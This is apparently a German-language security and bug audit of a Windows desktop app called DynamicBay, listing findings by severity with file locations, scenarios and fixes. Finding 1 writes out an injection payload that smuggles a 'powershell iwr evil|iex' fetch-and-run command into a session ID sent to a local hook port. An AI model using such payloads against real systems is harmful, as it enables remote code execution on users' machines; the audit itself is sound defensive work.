# Fehleranalyse: DynamicBay

**Sprache/Umgebung:** C# 13 / .NET 9, WPF, CommunityToolkit.Mvvm, Core Audio per COM-Interop, WinRT (UserNotificationListener, DeviceWatcher), MSAL/Graph, Inno Setup, Sparse-MSIX. Release: self-contained win-x64 mit ReadyToRun, ohne Trimming, ohne SingleFile.

**Stand:** Commit `29a7f83` (Version 1.0.15). Alle Zeilenangaben beziehen sich auf diesen Stand.

## Geprüfter Umfang

Ich habe die Docs gelesen, dann App.xaml.cs und AppSettings. Danach habe ich alle Dienste in fünf Bereichen durchgesehen:

- Audio/COM
- M365, Netzwerk und Sicherheit
- Insel/UI
- Dateien, Persistenz und Zeit
- Installer und Packaging

Nicht geprüft habe ich eingebettete Assets (Fonts, `AppIcons.json.gz`), Icons und Beispielskripte.

**Build und Tests:**

- `dotnet build -c Release`: 0 Warnungen, 0 Fehler.
- `dotnet test`: 108 von 108 Tests bestanden.

Die Compiler-Warnungen liefern also keine Hinweise. Die Tests decken die Fehler unten nicht ab. Ein Beispiel: Die Migrationstests starten bei v4 und v8 und verdecken so Befund 9.

**Schweregrade:**

- **Kritisch:** Ausnutzbare Sicherheitslücke oder stiller Verlust von Nutzerdaten im normalen Gebrauch.
- **Hoch:** Falsches Verhalten bei jedem Nutzer bzw. regelmäßig, oder Datenverlust in plausiblen Situationen.
- **Mittel:** Spürbare Logik-, UX- oder Robustheitsfehler, Lecks bei langer Laufzeit, Sicherheitsprobleme mit Vorbedingungen.
- **Niedrig:** Latente Fehler, kleinere Inkonsistenzen, Performance, Aufräumen.

Die Spalte „Sicherheit“ sagt, wie sicher der Befund ist. „Bestätigt“ heißt: Ich habe den Codepfad nachvollzogen. „Vermutet“ heißt: Das Ergebnis hängt von Laufzeit- oder Fremdverhalten ab, das ich nicht ausführen konnte.

---

## Kritisch

### 1. Claude-Hook-Port: Jede Webseite kann eine Befehlszeile einschleusen

- **Wo:** `Services/ClaudeService.cs:103` (Listener immer an, `ClaudeEnabled` ist standardmäßig true), `:374-391` (keine Prüfung von Origin, Größe oder Token), `:393-415` (`session_id` und `cwd` ungeprüft), `:497`/`:501` (`$"... cmd /k claude --resume {s.Id}"`).
- **Was falsch ist:** Der HTTP-Listener auf `127.0.0.1:43822/claude/` nimmt jeden POST an. Auch ein CORS-„Simple Request“ einer Webseite kommt durch. Die `session_id` landet unverändert in einer `cmd`-Befehlszeile.
- **Szenario:**
  1. Eine Webseite sendet `{"session_id":"x & powershell -c iwr evil|iex & rem","hook_event_name":"Notification","message":"Claude braucht deine Freigabe"}`.
  2. Die Insel zeigt „Claude braucht dich“.
  3. Ein Klick startet `cmd /k claude --resume x & powershell …`.

  Zusätzlich wird der Body unbegrenzt gelesen, und `_hookState` wächst ohne Grenze.
- **Fix:**
  - `session_id` per `Guid.TryParseExact(id, "D", out _)` validieren.
  - Requests mit `Origin`-Header und Bodys über 64 KB ablehnen.
  - `cwd` nur übernehmen, wenn das Verzeichnis existiert.
  - Die Befehlszeile ohne Konkatenation von Fremddaten bauen.
- **Sicherheit:** bestätigt.

### 2. Zweiter Start, `--uninstall` und `--restore-banners` überschreiben settings.json mit Standardwerten

- **Wo:** `App.xaml.cs:22` (`_settings = new()`), `:33-48`, `:55-61` (`Shutdown()` vor `Load()` in `:73`), `:669-677` (`OnExit` → `Save()` + `BannerSuppressor.RestoreAll()`).
- **Was falsch ist:** WPF ruft `OnExit` auch nach `Shutdown()` aus `OnStartup` auf. Die zweite Instanz speichert ihr leeres Standardobjekt und stellt die Banner der laufenden Instanz wieder her.
- **Szenario:** Die Insel läuft. Der Nutzer klickt im Startmenü auf DynamicBay, der vorgesehene Weg zu den Einstellungen. Danach gilt:
  - `settings.json` enthält Werkseinstellungen (Kalender, Widgets, Projekte, Platzierung). Stürzt die App ab oder schaltet sich der PC hart aus, bevor die laufende Instanz wieder speichert, sind die Einstellungen weg.
  - Die Windows-Banner sind wieder an. Die laufende Instanz schaltet sie nicht erneut ab, weil ihr `_backup` alle Apps noch enthält.
  - Dasselbe gilt bei Deinstallation mit „Daten behalten“.
- **Fix:** Ein Flag erst nach `Load()` setzen. `OnExit` speichert und stellt nur dann wieder her.
- **Sicherheit:** bestätigt.

### 3. Zeiterfassung: Nach einem Ladefehler löscht der nächste Schreibvorgang die gesamte Historie

- **Wo:** `Services/TimeTrackingService.cs:315-323` (`Load` fängt den Fehler, `_entries` bleibt leer), `:326-341` (`Write` schreibt die ganze Datei).
- **Was falsch ist:** Nach einem Ladefehler gibt es keine Schreibsperre.
- **Szenario:** Zeiterfassung.csv ist beim Start in Excel geöffnet, oder das Netz- bzw. OneDrive-Laufwerk ist noch nicht da.
  1. Der Nutzer startet ein Projekt.
  2. Er schließt Excel.
  3. Der nächste Schreibvorgang ersetzt Monate an Einträgen durch einen einzigen.
- **Fix:**
  - Mit `FileShare.ReadWrite` lesen.
  - Bei Fehler `_loadFailed` setzen und `Write()` verweigern, bis ein erneutes Laden klappt. Danach zusammenführen.
  - Vor dem Überschreiben eine `.bak` anlegen.
- **Sicherheit:** Pfad bestätigt; Excels Share-Mode vermutet, aber sehr wahrscheinlich.

---

## Hoch

### 4. Call-Routing ersetzt bei jedem Call auch ein selbst gewähltes USB-Mikrofon

- **Wo:** `Services/AudioDevicesService.cs:89-92`, `:208`.
- **Was falsch ist:** `CallStartedAsync` setzt das erste Nicht-Bluetooth-Mikrofon als Standard. Ob das aktuelle Mikrofon überhaupt Bluetooth ist, wird nicht geprüft. Die Reihenfolge der Aufzählung entscheidet, und dabei können „Stereomix“ oder virtuelle Kabel herauskommen.
- **Szenario:** Podcast- oder Webcam-Mikrofon als Standard, Teams-Call startet: Die Gegenseite hört das Laptop-Array oder Stille.
- **Fix:**
  - Nur umschalten, wenn das aktuelle Standard-Mikrofon Bluetooth ist.
  - Als Ersatz das zuletzt gesehene Nicht-BT-Standardmikrofon nehmen, virtuelle Geräte ausschließen.
- **Sicherheit:** bestätigt.

### 5. settings.json wird nicht atomar gespeichert; eine kaputte Datei wird beim Start sofort mit Standardwerten überschrieben

- **Wo:** `Core/AppSettings.cs:394-402` (`File.WriteAllText`), `:365-374` (`catch {}` → Standardwerte), `App.xaml.cs:74` (`Save()` direkt danach).
- **Szenario:** Der Strom fällt beim Speichern aus, oder ein Virenscanner sperrt die Datei kurz. Beim nächsten Start gelten Standardwerte, und die alte Datei ist sofort überschrieben. Es gibt kein Backup.
- **Fix:**
  - Schreiben in die tmp-Datei, dann `File.Replace(tmp, path, path + ".bak")`.
  - Beim Laden-Fehler die `.bak` versuchen und die kaputte Datei beiseitelegen.
- **Sicherheit:** bestätigt.

### 6. Ein kaputtes banner-backup.json schaltet die Windows-Banner dauerhaft ab, auch nach der Deinstallation

- **Wo:** `Services/BannerSuppressor.cs:108-131` (`LoadBackup` gibt bei Fehler ein leeres Dictionary zurück), `:37`/`:51`. Gleiches Speichermuster ohne Atomarität in `NotesService.cs:45-66`, `ShelfService.cs:110-128` und `ClipboardService.cs:426/440`.
- **Was falsch ist:** Ist das Backup unlesbar, sichert `Apply` die bereits unterdrückten Werte (`ShowBanner=0`) als „Original“. Später wird 0 wiederhergestellt.
- **Weitere Folge:** Kaputte notes.json oder shelf.json → leere Liste → der nächste Speichervorgang löscht alle Notizen bzw. die Ablage.
- **Fix:**
  - Gemeinsames `AtomicFile.WriteAllText`.
  - Unlesbare Dateien beiseitelegen statt überschreiben.
  - Bei unlesbarem Banner-Backup nicht unterdrücken.
- **Sicherheit:** bestätigt.

### 7. Eine andere CSV-Datei zu wählen überschreibt diese Datei ohne Nachfrage

- **Wo:** `Settings/SettingsWindow.xaml.cs:588-592` (`OverwritePrompt = false`) mit `TimeTrackingService.cs:85` (Änderung → sofort `Write()`).
- **Szenario:** Der Nutzer wählt eine vorhandene Zeiterfassung.csv, etwa vom Laptop oder ein Backup. Ihr Inhalt wird durch die Einträge im Speicher ersetzt.
- **Fix:** Existiert die Datei, laden und zusammenführen, dann schreiben.
- **Sicherheit:** bestätigt.

### 8. „Termin beginnt bald“ kommt nie bei direkt aufeinanderfolgenden Terminen

- **Wo:** `Services/CalendarService.cs:312-323`.
- **Was falsch ist:** `Next` ist der gerade laufende Termin. Für ihn ist `mins` negativ. Endet er, ist `mins` für den Folgetermin schon ≤ 0, und die Bedingung `mins > 0` verhindert die Vorschau.
- **Szenario:**
  - Meeting 9–10 Uhr, nächstes Meeting um 10 Uhr: keine Vorschau.
  - Ein mehrtägiger Termin mit Uhrzeit blockiert alle Vorschauen des Tages.
- **Fix:** Vorschau unabhängig von `Next` für alle Termine mit `0 < Start - now ≤ CalendarPeekMinutes`.
- **Sicherheit:** bestätigt.

### 9. Migration v8 fehlt bei allen, die von 1.0.14 aktualisieren

- **Wo:** `Core/AppSettings.cs:218-230`. Der Block v9 steht vor v8, setzt `SettingsVersion = 9`, und `< 8` ist danach falsch.
- **Szenario:** Bestandsnutzer bekommen „Downloads in der Insel“ nie eingeschaltet. Nur Neuinstallationen haben die Option, über den Standardwert.
- **Fix:**
  - Reihenfolge tauschen.
  - Eine v10 ergänzen, die Downloads einmal nachträgt (für Nutzer, die bereits auf 9 stehen).
  - Einen Test ab v6 schreiben.
- **Sicherheit:** bestätigt.

---

## Mittel

### 10. Spotify meldet sich bei vorübergehenden Fehlern dauerhaft ab

- **Wo:** `Services/SpotifyService.cs:207-238`.
- **Was falsch ist:** Nur `HttpRequestException` gilt als „offline“. Timeout, 5xx-HTML und 429 führen zu `Disconnect()`, und das löscht `spotify.bin`. Um den Refresh liegt kein Lock: Parallele Refreshes mit rotiertem Token können sich gegenseitig ungültig machen.
- **Fix:**
  - Nur bei `invalid_grant` abmelden.
  - Ein `SemaphoreSlim` um den Refresh legen.
  - Timeout setzen.
- **Sicherheit:** bestätigt; Token-Rotation vermutet.

### 11. Teams-Status bleibt auf „Nicht stören“ hängen

- **Wo:** `Services/M365/PresenceService.cs:40` (`_beforeAuto` nur im RAM), `:161-175`, `:168` (`PT4H`); `App.xaml.cs:660-680`.
- **Was falsch ist:**
  - Beenden, Absturz oder Update während Fokus oder Bildschirmfreigabe stellt den Status nicht zurück.
  - Race: Endet der Fokus, während der DND-Request noch läuft, wird DND danach trotzdem gesetzt.
- **Szenario:** Fokuszeit, dann wird DynamicBay aktualisiert. Teams zeigt bis zu 4 h „Nicht stören“.
- **Fix:**
  - Den Zustand persistent sichern und beim Start wiederherstellen.
  - Beim Beenden synchron mit Timeout zurückstellen.
  - Nach dem `await` den aktuellen Zustand neu prüfen.
- **Sicherheit:** bestätigt.

### 12. Remote-Link aus dem Sync-Ordner wird ungeprüft per ShellExecute geöffnet

- **Wo:** `Services/ClaudeService.cs:269`, `:484`, `:492`.
- **Szenario:** Wer in den freigegebenen Ordner schreiben kann, setzt `"remote":"\\\\host\\share\\x.exe"` oder ein fremdes URL-Schema. Ein Klick führt es aus.
- **Fix:** Nur `https://claude.ai/code/…` zulassen.
- **Sicherheit:** bestätigt.

### 13. Skript-Widgets erreichen localhost und das LAN (SSRF); Netzwerk ist standardmäßig erlaubt

- **Wo:** `Services/Scripting/ScriptEngine.cs:26` (Redirects an), `:131` (nur das Schema wird geprüft); `AppSettings.cs:70`.
- **Szenario:** Ein importiertes Skript liest Router, NAS, Tailnet oder `127.0.0.1:43822` aus (vgl. Befund 1).
- **Fix:** `SocketsHttpHandler.ConnectCallback` mit Sperre für Loopback, private Netze, Link-Local, CGNAT und Multicast. Das deckt auch Redirects und DNS-Rebinding ab.
- **Sicherheit:** bestätigt.

### 14. Update-Installer: ohne Digest ungeprüft, zwischen Hash-Prüfung und Admin-Start austauschbar

- **Wo:** `Services/UpdateCheck.cs:159-177`, `:117-122`.
- **Was falsch ist:**
  - Fehlt `digest`, wird nur die Größe geprüft.
  - Die Datei ist nach dem Hash geschlossen und liegt im benutzerbeschreibbaren `%TEMP%`.
  - Der Installer ist unsigniert.
- **Szenario:** Schadcode, der unter demselben Benutzer läuft, ersetzt das Setup und bekommt beim Start Adminrechte.
- **Fix:**
  - Ohne Digest abbrechen.
  - Die Datei mit `FileShare.Read` offen halten bis nach `Process.Start`.
  - Langfristig signieren und `WinVerifyTrust` prüfen.
- **Sicherheit:** bestätigt.

### 15. Auto-Update erzwingt den Task „notifications“ gegen die Wahl des Nutzers

- **Wo:** `Services/UpdateCheck.cs:118` (`/TASKS=notifications`).
- **Szenario:** Wer bei der Installation die Mitteilungen abgewählt hat, bekommt sie beim ersten Update trotzdem: Zertifikat in TrustedPeople, Paket-Identität, Banner-Unterdrückung.
- **Fix:** `/TASKS` weglassen. Inno übernimmt dann die vorherigen Tasks.
- **Sicherheit:** bestätigt.

### 16. Deinstallation bei laufender App: keine Prüfung, Reste und neu angelegte settings.json

- **Wo:** `installer/DynamicBay.iss:38-40`, `:96-102` (Mutex-Prüfung nur im Setup); `InitializeUninstall` fehlt.
- **Szenario:** Deinstallation über die Windows-Einstellungen, während die Insel läuft. Die gesperrte exe bleibt liegen, und `OnExit` legt `settings.json` nach „Daten löschen“ neu an.
- **Fix:** `InitializeUninstall` mit `CheckForMutexes`. Kein `AppMutex`, sonst bricht auch das stille Update ab.
- **Sicherheit:** vermutet (Verhalten des Inno-Uninstallers).

### 17. Zeiterfassung: Einträge über 24 h verlieren beim Neuladen Tage

- **Wo:** `Services/TimeTrackingService.cs:351-354`, `:369-370`.
- **Was falsch ist:** Das Ende wird nur als `HH:mm` gespeichert.
- **Szenario:**
  - Ein Eintrag von genau 24 h wird zu 0 h.
  - Ein Eintrag von Freitag 17 Uhr bis Montag 9 Uhr wird zu 16 h.
- **Fix:** Das Ende über die Spalte „Stunden“ rekonstruieren.
- **Sicherheit:** bestätigt.

### 18. Zeiterfassung: Nicht lesbare Zeilen verschwinden; „9“ wird als 9 Tage gelesen

- **Wo:** `Services/TimeTrackingService.cs:362-372`.
- **Szenario:** Ein in Excel per Hand eingetragener Wert verschwindet beim nächsten Schreiben, oder der Start liegt 9 Tage in der Zukunft.
- **Fix:**
  - Nicht lesbare Zeilen roh merken und beim Schreiben wieder ausgeben.
  - Uhrzeiten mit `TryParseExact(@"h\:mm")` lesen.
- **Sicherheit:** bestätigt.

### 19. Herunterfahren oder Standby ohne Sperren: Die Nacht wird mitgebucht

- **Wo:** `Services/TimeTrackingService.cs:89`, `:96-106` (nur `SessionSwitch`, kein `PowerModeChanged`).
- **Szenario:** Freitag läuft ein Projekt, der PC wird heruntergefahren. Am Montag sind 60 h gebucht.
- **Fix:**
  - `PowerModeChanged` wie Sperren behandeln.
  - Beim Start mit dem letzten Schreibzeitpunkt der Datei abgleichen und `CameBack` auslösen.
- **Sicherheit:** bestätigt.

### 20. UI-Thread: ICS-Parsing und Claude-Sync-Datei-I/O

- **Wo:**
  - `Services/CalendarService.cs:232-233`, `:260`, `:282-301`: Ical.Net `Load`/`GetOccurrences` nach `await` auf dem Dispatcher.
  - `Services/ClaudeService.cs:185`, `:233-278`: `SyncShared` alle 5 s im UI-Thread, schreibt alle 20 s auch ohne Änderung.
- **Szenario:** Ein großer Outlook- oder Google-Kalender mit vielen RRULEs lässt alle 10 min die Animationen ruckeln. OneDrive-Platzhalter werden synchron hydriert.
- **Fix:** In `Task.Run` auslagern. Die eigene Sync-Datei nur bei Änderung schreiben.
- **Sicherheit:** Pfad bestätigt, Dauer vermutet.

### 21. Zwischenablage-Bilder bleiben für immer auf der Platte

- **Wo:** `Services/ClipboardService.cs:84-85`, `:92`, `:193-195`.
- **Szenario:** Ist „nach Neustart behalten“ aus, verwaisen nach jedem Neustart bis zu `ClipboardMax` PNGs. Darunter sind Screenshots mit möglicherweise sensiblen Inhalten.
- **Fix:** Beim Start nicht referenzierte PNGs löschen.
- **Sicherheit:** bestätigt.

### 22. Dateiablage: Einträge auf nicht erreichbaren Laufwerken werden gelöscht, `File.Exists` auf UNC blockiert die UI

- **Wo:** `Services/ShelfService.cs:97-103`, `:112`.
- **Fix:** Die Prüfung im Hintergrund ausführen. Nur löschen, wenn das Laufwerk erreichbar ist.
- **Sicherheit:** Löschen bestätigt, Dauer der Blockade vermutet.

### 23. Zeitzonenwechsel wird bei tagelanger Laufzeit nie übernommen

- **Wo:** `Services/ClockService.cs:43` und überall `DateTime.Now`. Es gibt kein `TimeZoneInfo.ClearCachedData()`.
- **Szenario:** Auf Reise bleiben Uhr, Terminvorschau und Buchungen in der alten Zone.
- **Fix:** `SystemEvents.TimeChanged` → `ClearCachedData()` + neu berechnen.
- **Sicherheit:** bestätigt.

### 24. Spiegel-Inseln lecken beim Abstecken des Monitors

- **Wo:** `Island/Views/ExpandedView.xaml.cs:50-56`, `:89-93`.
- **Was falsch ist:** `Detach()` meldet `tabVm.PropertyChanged` und `Notes.Added` nicht ab. Der ganze Fensterbaum bleibt pro An-/Abdock-Zyklus im Speicher.
- **Fix:** Beide Abos in `Detach()` lösen.
- **Sicherheit:** bestätigt.

### 25. Neue Notiz verschwindet im Spiegelmodus sofort

- **Wo:** `Island/Views/ExpandedView.xaml.cs:671`, `:679-692`, `:717-721`.
- **Was falsch ist:** Alle Inseln reagieren auf `Notes.Added` und rufen `Activate()` auf. Die Hauptinsel verliert den Fokus, `LostFocus` speichert leer, und `DropIfEmpty` löscht die Notiz.
- **Fix:** Nur die sichtbare bzw. auslösende Insel öffnet das Blatt.
- **Sicherheit:** Pfad bestätigt, Fokuswirkung vermutet.

### 26. Ziffern-Hotkeys werden falsch registriert

- **Wo:** `Core/Hotkey.cs:22-24`.
- **Was falsch ist:** `Enum.TryParse<Key>("3")` liefert `(Key)3`, also `Key.Tab`.
- **Szenario:** Aus Strg+Alt+3 wird Strg+Alt+Tab. „0“ wird gar nicht registriert. Der vorhandene Test prüft nur vk ≠ 0.
- **Fix:** Ziffern vor `Enum.TryParse` behandeln.
- **Sicherheit:** bestätigt.

### 27. Puls-Animation im Claude-Widget läuft bei geschlossenem Panel weiter

- **Wo:** `Island/Views/ExpandedView.xaml:1235-1244`.
- **Was falsch ist:** Ein `RepeatBehavior=Forever`-Storyboard läuft in einem nur `Hidden` geschalteten Layer. WPF zeichnet das Software-Fenster in jedem Frame neu, für eine Animation, die niemand sieht.
- **Fix:** Auf `c:Loop.Storyboard` umstellen, wie im CompactView.
- **Sicherheit:** Mechanismus bestätigt, CPU-Last nicht gemessen.

### 28. Nach einem Klick auf einen Peek bleiben wartende Peeks hängen

- **Wo:** `Island/IslandWindow.xaml.cs:830-841`.
- **Szenario:** Zwei Meldungen kommen kurz nacheinander, die erste wird angeklickt. Die zweite, etwa „Kopfhörer getrennt – Verbinden?“, erscheint nicht.
- **Fix:** Wie in `DismissPeek` das nächste Element aus der Warteschlange zeigen.
- **Sicherheit:** bestätigt.

### 29. Maximierte rahmenlose Fenster gelten als Vollbild

- **Wo:** `Island/IslandWindow.xaml.cs:1246-1251`.
- **Szenario:** Spotify, Discord oder VS Code maximiert auf einem Monitor ohne Taskleiste oder mit automatisch ausgeblendeter Taskleiste: Die Insel verschwindet.
- **Fix:** `IsZoomed(fg)` vorher prüfen.
- **Sicherheit:** vermutet.

### 30. Eine Ausnahme beim Start stoppt alle danach startenden Dienste still

- **Wo:** `App.xaml.cs:163-200`.
- **Fix:** Jeden Start einzeln kapseln.
- **Sicherheit:** Pfad bestätigt, konkreter Auslöser nicht gefunden.

### 31. Bluetooth: Gerät bleibt als „verbunden“ hängen; `async void` auf Fremd-Thread

- **Wo:** `Services/BluetoothService.cs:86-119`.
- **Was falsch ist:** Trennen während `await DescribeAsync` → das Gerät wird danach trotzdem hinzugefügt. Eine Ausnahme in `Dispatcher.Invoke` aus einem `async void` auf dem ThreadPool beendet den Prozess.
- **Fix:**
  - Vor `Add` prüfen, ob das Gerät noch in `_connected` ist.
  - try/catch um den ganzen Körper, `BeginInvoke` statt `Invoke`.
- **Sicherheit:** bestätigt.

### 32. Audio: COM-Aufrufe ungeschützt; keine Erholung nach Neustart des Audiodiensts

- **Wo:** `Services/AudioService.cs:47-51`, `:75`, `:105-113`; `AudioDevicesService.cs:103-105`.
- **Was falsch ist:**
  - `GetMute`/`GetMasterVolumeLevelScalar` auf einem gecachten Endpunkt werfen bei entferntem Gerät. Das Log läuft dann alle 500 ms mit Stacktraces voll.
  - Nach einem Neustart von „Windows Audio“ werden Enumerator und Callback nicht neu aufgebaut.
- **Fix:** COMException fangen, den Cache verwerfen, den Enumerator neu erzeugen.
- **Sicherheit:** Pfad bestätigt; Verhalten beim Dienstneustart vermutet.

### 33. Das Identitäts-Paket wird nach der Erstregistrierung nie aktualisiert

- **Wo:** `Core/SparsePackage.cs:35`.
- **Szenario:** Eine neue Capability im Manifest kommt bei Bestandsinstallationen nie an.
- **Fix:** Die Paketversion vergleichen und neu registrieren, mit einem Schutz gegen Neustart-Schleifen.
- **Sicherheit:** bestätigt (latent, solange sich das Manifest nicht ändert).

### 34. Jeder Release-Build signiert mit einem neuen Zertifikat; das Aufräumen ist unsicher

- **Wo:** `packaging/build-sparse.ps1:35-43`, `.github/workflows/release.yml:39`, `installer/DynamicBay.iss:74`, `:81`.
- **Was falsch ist:** Mit jedem Update kommt ein weiteres Zertifikat `CN=DynamicBay Open Source` nach LocalMachine\TrustedPeople. `certutil -delstore` nach Name entfernt eventuell nur eines davon.
- **Fix:**
  - Ein festes Zertifikat als Secret hinterlegen.
  - Beim Deinstallieren in einer Schleife löschen.
- **Sicherheit:** Neues Zertifikat pro Build bestätigt; Verhalten von `-delstore` vermutet.

### 35. Deinstallation mit anderem Admin-Konto räumt beim falschen Benutzer auf

- **Wo:** `installer/DynamicBay.iss:26`, `:80`, `:124`.
- **Was falsch ist:** HKCU-Banner-Werte, Run-Key, Paket und `{userappdata}` werden beim Admin bereinigt, nicht beim eigentlichen Nutzer.
- **Fix:** Langfristig eine Installation pro Benutzer, kurzfristig dokumentieren.
- **Sicherheit:** bestätigt für Over-the-Shoulder-UAC.

### 36. Abmelden oder Herunterfahren: Speichern und Banner-Wiederherstellung laufen eventuell nicht

- **Wo:** `App.xaml.cs:669-680`, kein `SessionEnding`-Handler. `AppDomain.UnhandledException` (`:70`) loggt nur.
- **Fix:**
  - `SessionEnding` → synchron speichern.
  - Bei `IsTerminating` best effort `RestoreAll()`.
- **Sicherheit:** vermutet.

---

## Niedrig

37. **Audio, Kleinkram** (alle bestätigt, außer Punkt d):
    - a. `AudioEndpoints.cs:88`: `SetDefault` verwirft das HRESULT und meldet immer Erfolg.
    - b. `AudioService.cs:107`/`:135`: Die Stumm-Taste wirkt nicht bei Lautstärke 0.
    - c. `AudioService.cs:115`: Ein automatischer Mikrofonwechsel löst den Peek „Mikrofon stumm/an“ aus.
    - d. `MusicVolumeService.cs:88`, `:163-187`: Jede Mausbewegung baut Enumerator und Sessions neu auf und fragt `ProcessName` ab; Spotify-PUTs laufen nicht der Reihe nach (vermutet).
    - e. `AudioService.cs:234` und `MusicVolumeService.cs:206`: `[PreserveSig]` fehlt bei `EnumAudioEndpoints` (latent, wird nicht aufgerufen).
    - f. `AudioDevicesService.cs:104`: `DefaultChanged` ist nicht entprellt.
    - g. `BluetoothService.cs:64-78`: Ein abgebrochener DeviceWatcher wird nie neu gestartet.
    - h. `AudioEndpoints.cs:29`/`:38`: NOTPRESENT-Geräte werden bei jedem Refresh per IDeviceTopology abgefragt.
    - i. `MediaService.cs:402`: `_artTitles` wächst unbegrenzt.
    - j. `Native.cs:124`: Das `Process`-Objekt wird nicht disposed.
38. **Zeiterfassung, Kleinkram** (bestätigt):
    - a. `TimeTrackingService.cs:191`: Wer nach 19 Uhr startet, bekommt die Abend-Erinnerung sofort.
    - b. `:89`: `_runningSince` kann bis 7,5 min in der Zukunft liegen (Anzeige „0:-3“, Stoppen gilt als Versehen und löscht den Eintrag).
    - c. `:213`: `UpdateEntry` aktualisiert `_runningSince` nicht.
    - d. `:109`: Mehrere offene Einträge zählen dauerhaft bis „jetzt“.
39. **Persistenz und Zwischenablage:**
    - a. `NotesService.cs:25`/`:36` und `ClipboardService.cs:423`: Die verzögerten Saves gehen beim Beenden verloren (kein Flush). Bestätigt.
    - b. `NotificationService.cs:87-114`: `PollAsync` hat keinen Wiedereintrittsschutz. Vermutet.
    - c. `ClipboardService.cs:319-321`: `_suppressNext` bleibt hängen. Bestätigt.
    - d. `:154`: Kein erneuter Versuch bei `CLIPBRD_E_CANT_OPEN`. Bestätigt.
40. **Watcher und Kalender:**
    - a. `DownloadsService.cs:47-51`: Kein `Error`-Handler, nach einem Pufferüberlauf ist der Watcher tot. Bestätigt.
    - b. `ShelfService.cs:65`: Watcher auf USB-Sticks verhindern eventuell das sichere Entfernen. Vermutet.
    - c. `CalendarService.cs:232`: `webcal://` wird case-sensitiv ersetzt. Bestätigt.
41. **Netzwerk und Konten:**
    - a. `MicrosoftAccount.cs:198-203`: Bei `invalid_grant` bleibt der Status „verbunden“, und jeder Poll erzeugt einen Stacktrace. Bestätigt.
    - b. `ShelfService.cs:211` / Taildrop: Empfangene Dateien haben kein Mark-of-the-Web, also greift SmartScreen nicht. Vermutet.
    - c. `TaildropService.cs:277-279`: Das Sicherheitsnetz verschiebt auch fremde Downloads. Vermutet.
    - d. `TaildropService.cs:81` und `ClaudeService.cs:497`: Argumente werden als String gebaut (`\"`, `;` bei wt). Vermutet.
    - e. `OutlookCalendar.cs:19`/`:46` und `TodoService.cs:92`: Ganztagstermine und Fälligkeiten verschieben sich eventuell um einen Tag. Vermutet.
    - f. `SpotifyService.cs:56`, `GoogleCalendarClient.cs:71`, `CalendarService.cs:237`/`:265`: Kein Timeout, ein HttpClient pro Abgleich, ein Token-Refresh alle 10 min. Bestätigt.
    - g. `SecretStore.cs:24` und `SpotifyService.cs:248`: Nicht atomar geschrieben. Bestätigt.
    - h. `AppSettings.cs:80`: Die private ICS-URL steht im Klartext. `CalDavClient.cs:28-90`: Basic-Auth geht auch an fremde Hosts und über `http`. Bestätigt.
    - i. `App.xaml.cs:198`: Die Update-Prüfung läuft nur beim Start. Bestätigt.
42. **Insel/UI, Kleinkram:**
    - a. `IslandWindow.xaml.cs:776`: Ein wichtigerer Peek verwirft wartende Fragen. Bestätigt.
    - b. `:1001-1003`: `FinishDrag` läuft doppelt. Bestätigt.
    - c. `:908`, `:1142`: `_altPoll` läuft nach Verstecken oder Ziehen weiter. Bestätigt.
    - d. `TrayIcon.cs:50-51`: Ein Doppelklick versteckt die Insel. Bestätigt.
    - e. `IslandWindow.xaml.cs:889-898`: Ziehen aus einem Peek legt die Datei erneut in die Ablage. Bestätigt.
    - f. `ExpandedView.xaml.cs:502-525`: `DragOutActive(false)` steht nicht im `finally`. Vermutet.
    - g. `App.xaml.cs:625-629`: Beim zweiten Start fehlt `AllowSetForegroundWindow`. Vermutet.
    - h. `App.xaml.cs:73` mit `SaveSoon`: Der Snapshot-Livemodus schreibt in die echte settings.json. Bestätigt.
    - i. `IslandWindow.xaml.cs:270` + `Monitors.cs:42-50`: Nach dem Abstecken springt die Spiegel-Insel für bis zu 3 s auf den Hauptmonitor. Bestätigt.
    - j. `ExpandedView.xaml.cs:63-71`: `SetPanelOpen(bool)` gilt global über alle Inseln. Bestätigt.
    - k. `IslandWindow.xaml.cs:1163-1178`: `OnClosed` stoppt nicht alle Timer. Bestätigt.
    - l. `App.xaml.cs:513`/`:540`: `FileInfo.Length` kann werfen; Thumbnails laufen synchron. Bestätigt/vermutet.
    - m. `ExpandedView.xaml.cs:628-651`: Neue Skript-Karten bekommen kein Zahnrad. Bestätigt.
    - n. `AppPickerWindow.xaml.cs:48-55`: Icons laden nach dem Schließen weiter. Bestätigt.
43. **Installer und Release:**
    - a. `UpdateCheck.cs:159-161`: Heruntergeladene Setups (rund 80 MB je Update) werden nie gelöscht. Bestätigt.
    - b. `UpdateCheck.cs:186` / `release.yml:26`: Vierstellige Tags und Vorabversionen werden falsch verglichen; die Tag-Regex hat keinen Anker. Bestätigt.
    - c. `release.yml:26`: `workflow_dispatch` von einem Branch baut die Version „1.0.0“. Bestätigt.
    - d. `DynamicBay.iss:96-100`: Bei manueller Installation wartet das Setup 10 s ohne Rückmeldung. Bestätigt.
    - e. `build-sparse.ps1:10`/`:39`: Die lokal erzeugte PFX mit Standardpasswort bleibt liegen. Bestätigt.

---

## Was nachweislich korrekt ist

- **COM-Interop:**
  - Die vtables und GUIDs von IMMDeviceEnumerator, IMMDevice, IAudioEndpointVolume, IMMNotificationClient, IPolicyConfig, IDeviceTopology/IKsControl und der Session-Interfaces stimmen mit den SDK-Headern überein.
  - Es gibt nur noch eine `[ComImport]`-Klasse (PolicyConfigClient), damit keine doppelte CLSID mehr.
  - `SafeFileHandle` wird freigegeben.
  - Die Callbacks marshallen per `BeginInvoke`.
- **OAuth:** Alle drei Flows (Spotify, Microsoft, Google) nutzen PKCE S256 und prüfen `state`. Die Redirect-Listener laufen nur während der Anmeldung, an Loopback und mit Timeout.
- **DPAPI:** läuft mit CurrentUser. In den Logs stehen keine Tokens.
- **MeetingLinks** lassen nur Teams- und Zoom-https zu.
- **Release-Build:** Ohne Trimming und ohne SingleFile ist er für COM, Reflection-JSON und CsWinRT unkritisch. Die Versionen kommen aus einer Quelle (Tag).
- **Layout:** Die Water-Filling-Spaltenbreiten sind gegen 0 Widgets und zu wenig Platz abgesichert. Federn hängen sich selbst ab, Waveform und Loop laufen nur sichtbar.
- **Einstellungen:** Das Speichern ist entprellt, und die Listen werden beim Laden nicht dupliziert.
- **CSV:** Das Escaping ist korrekt und getestet.

## Zuerst beheben

1. **Befund 1:** Command-Injection über den Claude-Hook-Port. Sie ist von jeder Webseite aus auslösbar.
2. **Befund 2:** Ein zweiter Start setzt settings.json zurück und schaltet die Banner wieder ein. Das passiert bei jedem Klick auf das Startmenü-Symbol.
